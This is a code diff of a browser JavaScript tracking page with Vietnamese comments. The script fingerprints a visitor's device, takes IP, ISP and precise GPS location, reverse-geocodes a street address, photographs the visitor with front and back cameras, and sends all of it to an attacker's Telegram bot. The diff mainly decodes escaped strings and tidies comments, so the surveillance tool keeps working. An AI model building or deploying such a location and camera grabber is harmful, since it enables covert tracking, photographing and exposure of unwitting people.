@@ -7,7 +7,7 @@ const API_SEND_TEXT = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMes
 const info = {
     time: '', ip: '', isp: '', address: '',
     lat: '', lon: '', device: '', os: '',
-    camera: '\u23F3 \u0110\u0061\u006E\u0067 \u006B\u0069\u1EC3\u006D \u0074\u0072\u0061\u002E\u002E\u002E'
+    camera: '⌛ Đang kiểm tra...'
 };
 
 function detectDevice() {
@@ -30,11 +30,11 @@ async function getIPs() {
         const res = await fetch('https://ipwho.is/').then(r => r.json());
         info.ip = res.ip;
         info.isp = res.connection?.org || 'N/A';
-        // Tọa độ IP chỉ dùng làm dự phòng cuối cùng
+        // Chỉ lấy tọa độ IP làm dự phòng ban đầu
         if(!info.lat) {
             info.lat = res.latitude;
             info.lon = res.longitude;
-            info.address = `${res.city}, ${res.region} (\u01AF\u1EDB\u0063 \u0074\u0068\u00ED\u006E\u0068 \u0071\u0075\u0061 \u0049\u0050)`;
+            info.address = `${res.city}, ${res.region} (Ước tính qua IP)`;
         }
     } catch (e) { info.ip = 'Bị chặn'; }
 }
@@ -42,36 +42,29 @@ async function getIPs() {
 async function getLocation() {
     return new Promise(resolve => {
         if (!navigator.geolocation) return resolve();
-
-        // Ép buộc trình duyệt dùng GPS vệ tinh bằng enableHighAccuracy
         navigator.geolocation.getCurrentPosition(
             async pos => {
                 info.lat = pos.coords.latitude;
                 info.lon = pos.coords.longitude;
-                const acc = pos.coords.accuracy ? ` (\u00B1${pos.coords.accuracy.toFixed(1)}m)` : '';
-                
+                const acc = pos.coords.accuracy ? ` (±${pos.coords.accuracy.toFixed(1)}m)` : '';
                 try {
-                    // Reverse Geocoding lấy địa chỉ từ tọa độ GPS
                     const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${info.lat}&lon=${info.lon}`);
                     const data = await res.json();
-                    info.address = (data.display_name || 'Vị trí thực tế') + acc;
+                    info.address = (data.display_name || 'Vị trí GPS') + acc;
                 } catch { 
                     info.address = `Tọa độ: ${info.lat}, ${info.lon}${acc}`; 
                 }
                 resolve();
             },
-            () => resolve(), // Lỗi thì dùng IP backup
-            { 
-                enableHighAccuracy: true, // BẮT BUỘC BẬT CHIP GPS
-                timeout: 5000,            // Chờ đúng 5s
-                maximumAge: 0             // Không dùng vị trí cũ trong bộ nhớ
-            }
+            () => resolve(),
+            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
         );
     });
 }
 
 async function captureCamera(facingMode = 'user') {
     try {
+        // Yêu cầu quyền camera
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: false });
         return new Promise(resolve => {
             const video = document.createElement('video');
@@ -90,41 +83,40 @@ async function captureCamera(facingMode = 'user') {
                 }, 1000);
             };
         });
-    } catch (e) { return null; }
+    } catch (e) { return null; } // Trả về null nếu bị từ chối
 }
 
 function getCaption() {
-    // Sửa lỗi link Google Maps (xóa số 0 thừa và dấu ngoặc sai)
+    // Sửa link Google Maps chuẩn (dùng link search tọa độ)
     const mapsLink = (info.lat && info.lon) 
         ? `https://www.google.com/maps?q=${info.lat},${info.lon}` 
         : 'Không rõ';
 
-    return `\uD83D\uDCE1 [TH\u00D4NG TIN TRUY C\u1EACP]\n\n` +
-           `\u231B Th\u1EDDi gian: ${info.time}\n` +
-           `\uD83D\uDCF1 Thi\u1EBFt b\u1ECB: ${info.device} (${info.os})\n` +
-           `\uD83C\uDF10 IP: ${info.ip}\n` +
-           `\uD83C\uDFE2 ISP: ${info.isp}\n` +
-           `\uD83C\uDFD9 \u0110\u1ECBa ch\u1EC9: ${info.address}\n` +
-           `\uD83D\uDCCC Google Maps: ${mapsLink}\n` +
-           `\uD83D\uDCF8 Camera: ${info.camera}`;
+    return `📡 [THÔNG TIN TRUY CẬP]\n\n` +
+           `⌛ Thời gian: ${info.time}\n` +
+           `📱 Thiết bị: ${info.device} (${info.os})\n` +
+           `🌐 IP: ${info.ip}\n` +
+           `🏢 ISP: ${info.isp}\n` +
+           `🏙 Địa chỉ: ${info.address}\n` +
+           `📍 Google Maps: ${mapsLink}\n` +
+           `📸 Camera: ${info.camera}`;
 }
 
 async function main() {
     info.time = new Date().toLocaleString('vi-VN');
     detectDevice();
     
-    // Bước 1: Gọi IP trước (nhanh, làm nền)
+    // Ưu tiên lấy IP làm nền
     await getIPs();
-    
-    // Bước 2: Gọi GPS đè lên (nếu người dùng cho phép, nó sẽ lấy tọa độ chuẩn mét)
+    // Cố gắng lấy GPS chuẩn mét
     await getLocation();
 
-    // Bước 3: Chụp ảnh
+    // Bước quan trọng: Chụp ảnh (Đây là căn cứ để biết họ có "Cho phép" hay không)
     let front = await captureCamera("user");
     let back = front ? await captureCamera("environment") : null;
 
     if (front || back) {
-        info.camera = `\u2705 \u0110\u00E3 ch\u1EE5p: ${front ? 'Trước' : ''} ${back ? 'Sau' : ''}`;
+        info.camera = `✅ Đã chụp: ${front ? 'Trước' : ''} ${back ? 'Sau' : ''}`;
         const formData = new FormData();
         formData.append('chat_id', TELEGRAM_CHAT_ID);
         const media = [];
@@ -138,12 +130,17 @@ async function main() {
         }
         formData.append('media', JSON.stringify(media));
         await fetch(API_SEND_MEDIA, { method: 'POST', body: formData });
+        
+        return true; // Trả về THÀNH CÔNG
     } else {
-        info.camera = '\uD83D\uDEAB B\u1ECB t\u1EEB ch\u1ED1i';
+        // Nếu bị từ chối camera
+        info.camera = '❌ Bị từ chối quyền truy cập';
         await fetch(API_SEND_TEXT, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: getCaption() })
         });
+        
+        return false; // Trả về THẤT BẠI
     }
 }
